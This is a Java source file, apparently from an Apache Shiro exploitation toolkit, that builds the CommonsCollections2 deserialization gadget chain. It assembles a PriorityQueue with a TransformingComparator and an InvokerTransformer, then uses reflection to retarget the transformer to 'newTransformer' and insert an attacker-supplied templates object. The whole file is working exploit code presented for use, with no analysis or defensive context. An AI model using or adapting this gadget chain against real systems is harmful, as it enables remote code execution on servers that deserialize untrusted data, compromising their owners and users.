package shiro.gadgets.payload;

import java.util.Comparator;
import java.util.PriorityQueue;
import java.util.Queue;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;
import shiro.gadgets.commons.Reflections;


public class CommonsCollections2  {

    public Queue<Object> getObject(Object templates) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);


        PriorityQueue<Object> queue = new PriorityQueue(2, (Comparator<? super Object>)new TransformingComparator((Transformer)transformer));

        queue.add(Integer.valueOf(1));
        queue.add(Integer.valueOf(1));


        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");


        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = Integer.valueOf(1);

        return queue;
    }
}